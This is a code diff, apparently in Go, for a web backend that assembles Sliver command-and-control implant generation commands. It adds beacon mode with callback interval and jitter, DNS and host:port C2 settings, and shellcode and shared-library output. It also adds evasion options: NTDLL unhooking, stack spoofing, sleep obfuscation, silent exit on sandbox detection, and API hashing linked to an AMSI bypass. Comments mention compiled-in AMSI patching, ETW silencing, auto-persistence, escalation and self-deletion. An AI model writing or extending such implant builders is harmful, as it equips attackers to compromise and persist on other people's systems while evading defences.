@@ -412,14 +412,18 @@ func buildGenerateOptions(os, arch string) generateOptions {
 // ─────────────────────────────────────────────────────────────────────────────
 
 type generateReq struct {
-	OS        string            `json:"os"`
-	Arch      string            `json:"arch"`
-	Protocol  string            `json:"protocol"`
-	C2Host    string            `json:"c2host"`
-	C2Port    uint32            `json:"c2port"`
-	Format    string            `json:"format"`
-	Name      string            `json:"name,omitempty"`
-	Evasion   map[string]bool   `json:"evasion"`
+	OS             string          `json:"os"`
+	Arch           string          `json:"arch"`
+	Protocol       string          `json:"protocol"`
+	C2Host         string          `json:"c2host"`
+	C2Port         uint32          `json:"c2port"`
+	Format         string          `json:"format"`
+	Name           string          `json:"name,omitempty"`
+	IsBeacon       bool            `json:"is_beacon"`
+	BeaconInterval int64           `json:"beacon_interval"` // milliseconds
+	BeaconJitter   int64           `json:"beacon_jitter"`   // seconds
+	Domains        []string        `json:"domains,omitempty"`
+	Evasion        map[string]bool `json:"evasion"`
 }
 
 type generateResp struct {
@@ -458,33 +462,88 @@ func handleGenerate(w http.ResponseWriter, r *http.Request) {
 }
 
 func buildGenerateCommand(req generateReq) string {
-	parts := []string{fmt.Sprintf("generate --%s %s:%d", req.Protocol, req.C2Host, req.C2Port)}
-	parts = append(parts, "--os "+req.OS)
-	parts = append(parts, "--arch "+req.Arch)
-	// APK is a post-generate packaging step; the server generates an ELF binary.
-	genFormat := req.Format
-	if genFormat == "apk" {
-		genFormat = "exe"
+	// ── Map OS to GOOS ───────────────────────────────────────────────────────
+	goos := req.OS
+	if goos == "macos" {
+		goos = "darwin"
 	}
+
+	// ── Map UI format names → Sliver format values ───────────────────────────
+	// Valid Sliver formats: exe, shared, service, shellcode
+	genFormat := req.Format
+	switch genFormat {
+	case "apk", "elf", "macho", "script", "sh":
+		genFormat = "exe" // APK is a post-generate step; generate the ELF first
+	case "dll", "so", "dylib":
+		genFormat = "shared"
+	case "bin":
+		genFormat = "shellcode"
+	}
+
+	// ── Base command (generate vs generate beacon subcommand) ─────────────────
+	var parts []string
+	if req.IsBeacon {
+		parts = append(parts, "generate beacon")
+	} else {
+		parts = append(parts, "generate")
+	}
+
+	// ── C2 connection string ──────────────────────────────────────────────────
+	if req.Protocol == "dns" && len(req.Domains) > 0 {
+		// DNS expects domain names, not host:port
+		parts = append(parts, "--dns "+strings.Join(req.Domains, ","))
+	} else {
+		parts = append(parts, fmt.Sprintf("--%s %s:%d", req.Protocol, req.C2Host, req.C2Port))
+	}
+
+	// ── Target ───────────────────────────────────────────────────────────────
+	parts = append(parts, "--os "+goos)
+	parts = append(parts, "--arch "+req.Arch)
+
+	// ── Format (only needed if not the default exe) ───────────────────────────
 	if genFormat != "" && genFormat != "exe" {
 		parts = append(parts, "--format "+genFormat)
 	}
-	// Add active evasion flags
-	evasionFlags := map[string]string{
-		"evasion":      "--evasion",
-		"obfuscate":    "--obfuscate",
-		"ntdll_unhook": "--evasion",  // included in --evasion pack
+
+	// ── Evasion flags — only valid CLI flags accepted by the server ───────────
+	// --evasion: overwrite user-space hooks, NTDLL clean copy, stack spoof
+	if req.Evasion["ntdll_unhook"] || req.Evasion["stack_spoof"] || req.Evasion["indirect_syscall"] {
+		parts = append(parts, "--evasion")
 	}
-	addedEvasion := false
-	for key, flag := range evasionFlags {
-		if req.Evasion[key] && !(flag == "--evasion" && addedEvasion) {
-			parts = append(parts, flag)
-			if flag == "--evasion" { addedEvasion = true }
-		}
+	// --sleep-obfuscation: encrypt heap during sleep (Windows only, no-op elsewhere)
+	if req.Evasion["sleep_obfuscation"] {
+		parts = append(parts, "--sleep-obfuscation")
 	}
+	// --sandbox-detection: exit silently if sandbox heuristics fire
+	if req.Evasion["sandbox_detect"] {
+		parts = append(parts, "--sandbox-detection")
+	}
+	// --api-hashing: resolve suspicious Win APIs via PEB walk + DJB2
+	if req.Evasion["amsi_bypass"] || req.Evasion["api_hashing"] {
+		parts = append(parts, "--api-hashing")
+	}
+	// NOTE: garble symbol obfuscation is ON by default.
+	// Other evasion options (AMSI patch, ETW silence, auto-escalate, auto-persist,
+	// watchdog, anti-debug, self-delete) are compiled in via hardenx_*.go build tags
+	// and require no additional CLI flags.
+
+	// ── Name ─────────────────────────────────────────────────────────────────
 	if req.Name != "" {
 		parts = append(parts, "--name "+req.Name)
 	}
+
+	// ── Beacon interval ───────────────────────────────────────────────────────
+	if req.IsBeacon {
+		secs := req.BeaconInterval / 1000
+		if secs <= 0 {
+			secs = 60
+		}
+		parts = append(parts, fmt.Sprintf("--seconds %d", secs))
+		if req.BeaconJitter > 0 {
+			parts = append(parts, fmt.Sprintf("--jitter %d", req.BeaconJitter))
+		}
+	}
+
 	parts = append(parts, "--save /tmp/")
 	return strings.Join(parts, " ")
 }
